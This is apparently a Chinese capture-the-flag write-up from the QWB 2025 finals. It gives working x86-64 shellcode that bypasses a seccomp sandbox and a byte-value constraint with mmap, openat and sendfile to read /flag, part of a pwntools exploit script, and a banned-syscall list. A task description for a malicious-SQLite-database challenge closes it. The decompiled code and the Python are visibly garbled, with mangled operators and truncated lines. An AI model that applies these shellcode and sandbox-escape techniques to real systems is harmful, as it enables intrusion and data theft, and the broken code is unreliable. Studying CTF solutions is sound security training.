
## 反编译代码

```c
int __fastcall sub_56F17A9626C0(void *src, size_t n)

{

    _BYTE *v2; // rax

    size_t v3; // rbx

    _BYTE *v4; // r14

    char v5; // al

    __int64 v6; // rcx

    int b1; // esi

    unsigned __int16 b2; // cx

    int b3; // eax

    unsigned int v10; // r14d

    char v11; // bl

    char i; // bp

    unsigned int *v13; // rcx

    unsigned int v14; // eax

    unsigned int v15; // edx

    bool v16; // cf

    unsigned int v17; // r14d

    __int64 v18; // rbx

    size_t v19; // r13

    unsigned int v21; // [rsp+Ch] [rbp-8Ch] BYREF

    void *v22; // [rsp+10h] [rbp-88h] BYREF

    int v23; // [rsp+18h] [rbp-80h]

    _DWORD v24[2]; // [rsp+1Ch] [rbp-7Ch] BYREF

    _BYTE v25[4]; // [rsp+24h] [rbp-74h]

    int v26; // [rsp+28h] [rbp-70h]

    int v27; // [rsp+2Ch] [rbp-6Ch]

    char v28; // [rsp+30h] [rbp-68h]

    int v29; // [rsp+34h] [rbp-64h]

    int v30; // [rsp+38h] [rbp-60h]

    char v31; // [rsp+3Ch] [rbp-5Ch]

    size_t v32; // [rsp+40h] [rbp-58h]

    _BYTE *v33; // [rsp+48h] [rbp-50h]

    size_t v34; // [rsp+50h] [rbp-48h]

    __int64 v35; // [rsp+58h] [rbp-40h]

    __int64 v36; // [rsp+60h] [rbp-38h]

    v22 = 0;

    getrandom(&v22, 4, 0);

    v22 = (void *)((_QWORD)v22 = 5 )

                break;

            *v13 = 0;

            v16 = v10 = 5 )

            goto LABEL_15;

        LABEL_20:

        *((_BYTE *)v13 + 8) = 0;

        i = v25[0];

        v11 = v28;

        if ( (v25[0] & 1) != 0 )

            goto LABEL_9;

        LABEL_21:

        if ( (v11 & 1) != 0 )

            goto LABEL_9;

        if ( v31 != 1 || v14 
```

## Shellcode 游戏校验

`shellcode` 每连续三个字节为一组进行如下游戏校验：

### 游戏背景

- 游戏有 3 个玩家和一个 boss，三个玩家的血量分别为 `shellcode` 字节值 + 255。
- boss 的血量为三个玩家血量之和。
- 所有人的攻击力为 5，没有防御属性，即一次攻击会令对手损失 5 点生命值。
- 血量 每个回合中执行如下操作：
  - 随机选择一个存活状态的玩家与 boss 进行战斗。
  - 玩家先攻击，令 Boss 损失 5 点生命值。
  - Boss 攻击选定玩家，损失 5 点生命值。
- 任意时间内，有一方完全死亡时游戏结束，完全死亡的一方游戏失败。

把游戏抽象为数学模型，不妨设三个玩家的生命值为 `5x + a`、`5y + b`、`5z + c`，Boss 血量根据要求为 `5(x + y + z) + (a + b + c) | (a,b,c`。

说白了，这游戏就不太可能可以赢，因为一个 `5x + a` 血量的人物只能给 Boss 造成 `5x` 的伤害，但是好在玩家先手，如果前面两个人（可以证明，游戏输赢和攻击顺序无关）死亡的情况下，剩下最后一个人，双方血量分别为 `5z + c` 和 `5z + a + b + c`，经过 `z - 1` 个回合之后，血量变成 `5 + z` 和 `5 + a + b + c`，最后一刻，必须给 Boss 致命一击，即攻击过后 `a + b + c`，不然它再打过来玩家必输。

这里的 `a`、`b`、`c` 自然就是 `byte % 5` 的值，所以 `shellcode` 必须满足下面的要求。

```python
for i in range(len(shellcode)-2):
    s = 0
    for j in range(3):
        s += shellcode[i+j] % 5
    if s >= 5:
        print("error")
        quit()
```

只要任意三个连续的字节 `%5` 相加的值大于等于 5，这个 `shellcode` 就是不合法的。

所以尽量要选择权值（`%5` 得到的值）尽可能低的指令去输入，一些比较好用的指令：

```asm
jmp $+2

; EB 00

; 0  0

mov ecx, $imm

; B9 ?? ?? ?? ??

; 0  ?? ?? ?? ??
```

其余一些 `mov` 指令巨难用，一不小心就会超过，所以推荐用 `xchg r1,r2`，它的优点就是，如果正着来权值过大可以反过来，即写 `xchg r2,r1`，指令效果完全等价。

![](https://xia0ji233.pro/2025/11/26/qwb2025_final/17.png)

## 沙箱与利用

执行 `shellcode` 之前，它把几乎所有寄存器都清零了，也就是找不到一个可写的地址。

在此之前，也先看看沙箱

![](https://xia0ji233.pro/2025/11/26/qwb2025_final/18.png)

这里我选择是直接 patch `main` 函数，直接执行 `sandbox` 函数，得到的沙箱结果。

这个沙箱很简单，直接 `openat + sendfile` 即可，但是可写内存没有，因此我选择了 `mmap` 去分配内存，然后将栈定向到这块内存中去（虽然没用到），这块内存可以用于去写 `/flag` 字符串。

这个题目在执行 `shellcode` 之后还关闭了标准输入，导致我们没有办法重写 `shellcode`，只能按照它的要求和规则去书写。

下面是我写的 `shellcode`

```asm
mov ecx,9
mov eax,ecx
mov edi,0
mov esi,0xa000
mov edx,7
mov ecx,0x22
mov r10d,ecx
syscall
; openat

add rax, 0x5000

mov rbx,rax
jmp $+2
xchg rbx,rbp
mov rbx,rax
xchg rbx,rsp
sub rax,0x5000

mov rbx,rax

; write /flag
mov ecx,'/'
mov [rbx],cl
jmp $+2
inc rbx

mov ecx,'f'
mov [rbx],cl
jmp $+2
inc rbx

mov ecx,'l'
mov [rbx],cl
jmp $+2
inc rbx

mov ecx,'a'
mov [rbx],cl
jmp $+2
inc rbx

mov ecx,'g'
mov [rbx],cl
jmp $+2
inc rbx

mov ecx, 0
mov [rbx],cl
jmp $+2
inc rbx
jmp $+2

mov rbx,rax
jmp $+2
xchg rsi,rbx
jmp $+2
mov ecx,0
jmp $+2
mov edi,ecx
jmp $+2
mov ecx,0
jmp $+2
mov edx,ecx
jmp $+2
mov ecx,1
jmp $+2
mov edi,ecx
jmp $+2
mov ecx,257
jmp $+2
mov eax,ecx
jmp $+2
syscall

mov ecx,0

jmp $+2
mov esi,ecx
jmp $+2
mov ecx,1
jmp $+2
mov edi,ecx
jmp $+2
mov ecx,0x30
mov r10d,ecx

mov ecx,40
mov eax,ecx
mov ecx,0
mov edx,ecx
syscall
;sendfile

shellcode满足要求之后直接写 exp 脚本，这里省略了爆破密码的步骤。
```

## Exp 脚本

`shellcode` 满足要求之后直接写 `exp` 脚本，这里省略了爆破密码的步骤。

```python
from pwn import *

from m import find_k_b_from_sequence

context.log_level = 'debug'

context.arch = 'amd64'

import os

import sys

from pwn import *

# from z3 import *

def ror64(value, shift, bits=64):

    """64位循环右移 - rol64的逆操作"""

    shift %= bits

    return ((value >> shift) | (value > (bits - shift))) & ((1 > 1) ^ ((v6 ^ (v6 >> 1)) >> 2) ^ ((v6 ^ (v6 >> 1) ^ ((v6 ^ (v6 >> 1)) >> 2)) >> 4) ^ (

                (v6 ^ (v6 >> 1) ^ ((v6 ^ (v6 >> 1)) >> 2) ^ ((v6 ^ (v6 >> 1) ^ ((v6 ^ (v6 >> 1)) >> 2)) >> 4)) >> 8) ^ (

                     (v6 ^ (v6 >> 1) ^ ((v6 ^ (v6 >> 1)) >> 2) ^ ((v6 ^ (v6 >> 1) ^ ((v6 ^ (v6 >> 1)) >> 2)) >> 4) ^ ((

                                                                                                                                  v6 ^ (

                                                                                                                                      v6 >> 1) ^ (

                                                                                                                                              (

                                                                                                                                                          v6 ^ (

                                                                                                                                                              v6 >> 1)) >> 2) ^ (

                                                                                                                                              (

                                                                                                                                                          v6 ^ (

                                                                                                                                                              v6 >> 1) ^ (

                                                                                                                                                                      (

                                                                                                                                                                                  v6 ^ (

                                                                                                                                                                                      v6 >> 1)) >> 2)) >> 4)) >> 8)) >> 16)

    v7 = v7 & 0xFFFFFFFFFFFFFFFF

    v7h = v7 >> 32

    v8 = rol64(v7 ^ v7h, 7)

    return v8

def inverse_xor_shift(y, k):

    """逆异或变换：从 y 恢复 x，满足 y = x ^ (x >> k)"""

    x = y

    shift = k

    while shift > shift)

        shift *= 2

    return x & 0xFFFFFFFFFFFFFFFF

def inverse_mix(v8):

    """mix 函数的逆向算法"""

    # 步骤1: 循环右移7位得到 u

    u = ror64(v8, 7)

    # 步骤2: 从 u 恢复 v7

    u_high = (u >> 32) & 0xFFFFFFFF

    u_low = u & 0xFFFFFFFF

    v7_high = u_high

    v7_low = u_low ^ u_high

    v7 = (v7_high 
```

最终也是直接拿到 `flag`。

![](https://xia0ji233.pro/2025/11/26/qwb2025_final/19.png)

## 系统调用限制

这道题只能 patch 沙箱的配置文件，一共 10 个 ban 位，`openat` 加白了，原生 `orw` 天然 ban 位，主要禁止的地方是读取文件，以下系统调用都能够读取文件。

- `mmap`
- `read`
- `readv`
- `pread64`
- `preadv`
- `preadv2`
- `splice`
- `sendfie`
- `io_uring`
- `io_setup`

总的来说，这题的质量还是非常高的，虽然比赛被折磨的很难受吧）

3. RW
4. TrustSQL

## 题目文档

> 题目名称：trustSQL
>
> 旗帜名称：TSTSQ
>
> 题目描述：附件中给出了一个Ubuntu虚拟机，该虚拟机与台上靶机内的虚拟机环境完全相同，仅有系统密码不同。请挖掘并利用 `/home/qwb/sqlite3` 中的漏洞，构造一个恶意的数据库文件（假设用户完全信任并加载该数据库文件），实现用户在虚拟机中利用 `sqlite3` 打开该数据库文件，并执行特定的查询后，能自动弹出系统计算器。上台演示的时候注意关闭 `exp` 的调试信息。
>
> 附件信息： 附件中的虚拟机与台上靶机内的虚拟机环境完全相同，仅有系统密码不同。附件中虚拟机系统用户名为qwb，密码为admin。
>
> 台上拓扑：交换机同时连接选手攻击机和靶机。靶机中使用vmware（最新版）开启附件中提供的虚拟机环境（操作系统Ubuntu，仅系统密码和附件中的虚拟机不同），该虚拟机已在 `/home/qwb/sqlite3` 正确安装 `sqlite3`。
>
> 展示目标：选手携带自己的攻击机上台，将可以完成漏洞利用的恶意数据库文件上传到自己的HTTP服务器。操作员将在靶机的Ubuntu虚拟机中，下载并利用 `sqlite3` 加载选手HTTP服务器上的恶意数据库文件（`/home/qwb/sqlite3 malicious.db`），然后在 `sqlite3` 中依次执行特定的查询命令（`PRAGMA trusted_schema = ON; select users from qwbDB;`）。在加载数据库并执行特定查询命令后的规定时间内，自动在Ubuntu虚拟机中弹出系统计算器。
